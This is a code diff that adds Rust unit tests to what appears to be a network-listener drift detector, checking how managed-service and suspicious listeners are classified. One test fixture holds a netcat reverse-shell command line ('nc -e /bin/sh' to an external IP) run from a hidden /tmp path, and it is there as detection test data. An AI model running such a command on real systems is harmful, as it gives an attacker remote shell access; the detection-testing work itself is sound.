@@ -62,6 +62,44 @@ fn reports_new_public_port_from_baseline_drift() {
 }
 
 #[test]
+fn marks_managed_service_port_drift_for_noise_scoring() {
+    let findings = detect_with_default_config(vec![RawEvent::new("baseline", "listening_socket")
+        .with_field("protocol", "tcp6")
+        .with_field("local_addr", "::")
+        .with_field("local_port", "8443")
+        .with_field("process_name", "proxy-service")
+        .with_field("executable", "/usr/bin/proxy-service")
+        .with_field("systemd_unit", "proxy-service.service")
+        .with_field("cmdline", "/usr/bin/proxy-service run")]);
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-001");
+    assert!(findings[0]
+        .evidence
+        .iter()
+        .any(|item| item.key == "managed_service_listener" && item.value == "true"));
+}
+
+#[test]
+fn does_not_mark_shell_listener_as_managed_service_drift() {
+    let findings = detect_with_default_config(vec![RawEvent::new("baseline", "listening_socket")
+        .with_field("protocol", "tcp")
+        .with_field("local_addr", "0.0.0.0")
+        .with_field("local_port", "8443")
+        .with_field("process_name", "sh")
+        .with_field("executable", "/tmp/.x/sh")
+        .with_field("systemd_unit", "proxy-service.service")
+        .with_field("cmdline", "sh -c nc -e /bin/sh 1.2.3.4 4444")]);
+
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0].rule_id, "NET-003");
+    assert!(!findings[0]
+        .evidence
+        .iter()
+        .any(|item| item.key == "managed_service_listener"));
+}
+
+#[test]
 fn suppresses_generic_udp_high_port_from_baseline_drift() {
     let findings = detect_with_default_config(vec![udp_socket_event("baseline", 51659)]);
     assert!(findings.is_empty());
